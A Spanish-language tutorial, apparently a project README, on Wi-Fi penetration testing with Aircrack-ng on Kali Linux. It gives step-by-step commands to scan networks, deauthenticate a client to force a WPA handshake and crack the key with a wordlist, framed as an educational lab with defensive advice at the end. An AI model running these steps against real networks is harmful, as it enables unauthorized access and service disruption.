## **📌- Auditing & Attacking Wi-Fi Networks**  

```md
# 🚀 Auditing & Attacking Wi-Fi Networks with Aircrack-ng  

📌 **Descripción**  
Este proyecto documenta cómo auditar y probar la seguridad de redes Wi-Fi utilizando **Aircrack-ng en Kali Linux**. Aprenderás a descubrir redes, capturar paquetes, interceptar handshakes y **crackear contraseñas WEP/WPA/WPA2**.  

⚠️ **Este proyecto es solo para fines educativos. No realices pruebas en redes sin autorización.**  

---

## **🛠️ Lab Set-up y Herramientas**  

### 📌 **Arquitectura del Laboratorio**  
```
+------------------+        +------------------+
|   Attacker       |  ----> |  Wi-Fi Router    |
|  (Kali Linux)    |        |  (Target Network)|
|  192.168.1.100   |        |  192.168.1.1     |
+------------------+        +------------------+
                              |
                              v
                    +------------------+
                    | Target Device    |
                    | (Wi-Fi Client)   |
                    | 192.168.1.101    |
                    +------------------+
```

### 🔧 **Herramientas Utilizadas**  
✅ **Kali Linux** → Distribución especializada en pentesting.  
✅ **Aircrack-ng** → Suite para auditoría de redes Wi-Fi.  
✅ **Wireshark** → Análisis de tráfico de red.  
✅ **Wi-Fi Adapter** → Tarjeta Wi-Fi compatible con **modo monitor**.  

---

## **📌 Instalación de Aircrack-ng**  
Aircrack-ng ya viene **preinstalado en Kali Linux**, pero puedes actualizarlo con:  
```bash
sudo apt update && sudo apt install aircrack-ng -y
```

---

## **📌 Tareas de Pentesting en Wi-Fi**  

### **🕵️ Task 1: Configurar la Tarjeta Wi-Fi en Modo Monitor**  
📌 **Detectar adaptadores Wi-Fi disponibles:**  
```bash
iwconfig
```
📌 **Habilitar modo monitor (reemplaza `wlan0` con tu interfaz Wi-Fi):**  
```bash
sudo airmon-ng start wlan0
```
✅ **Salida esperada:** La interfaz cambia a `wlan0mon` (modo monitor activo).  

---

### **📡 Task 2: Descubrir Redes Wi-Fi Cercanas**  
📌 **Escanear redes Wi-Fi en el entorno:**  
```bash
sudo airodump-ng wlan0mon
```
✅ **Salida esperada:** Lista de redes disponibles con SSID, BSSID, canal y cifrado.  

---

### **📂 Task 3: Capturar Paquetes de Handshake**  
📌 **Capturar tráfico de una red específica (reemplaza `BSSID` y `Canal`):**  
```bash
sudo airodump-ng --bssid XX:XX:XX:XX:XX:XX -c X -w capture wlan0mon
```
✅ **Salida esperada:** Se guardan paquetes en `capture-01.cap`.  

📌 **Desautenticar un cliente para forzar un handshake (reemplaza MACs):**  
```bash
sudo aireplay-ng --deauth 10 -a XX:XX:XX:XX:XX:XX -c YY:YY:YY:YY:YY:YY wlan0mon
```
✅ **Salida esperada:** Cliente desconectado y nuevo handshake capturado.  

---

### **🔓 Task 4: Crackear Contraseñas WPA/WPA2**  
📌 **Intentar romper la clave con un diccionario (ejemplo: rockyou.txt):**  
```bash
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```
✅ **Salida esperada:** Si la contraseña está en el diccionario, se muestra la clave Wi-Fi.  

---

### **📊 Task 5: Análisis de Tráfico con Wireshark**  
📌 **Abrir el archivo de captura en Wireshark:**  
```bash
sudo wireshark capture-01.cap
```
✅ **Salida esperada:** Vista detallada de los paquetes de handshake y tráfico de red.  

---

## **📚 Recursos Adicionales**  
📌 **[Aircrack-ng Documentation](https://www.aircrack-ng.org/documentation.html)**  
📌 **[Wireshark Official Site](https://www.wireshark.org/)**  
📌 **[Kali Linux Documentation](https://www.kali.org/docs/)**  

---

## **📌 Conclusión**  
🎯 **Este proyecto enseña cómo evaluar la seguridad de redes Wi-Fi de forma ética.**  
💡 **Aprendimos a identificar redes, capturar handshakes y descifrar claves.**  
📌 **La seguridad Wi-Fi puede mejorarse con WPA3, claves fuertes y MAC filtering.**  

---

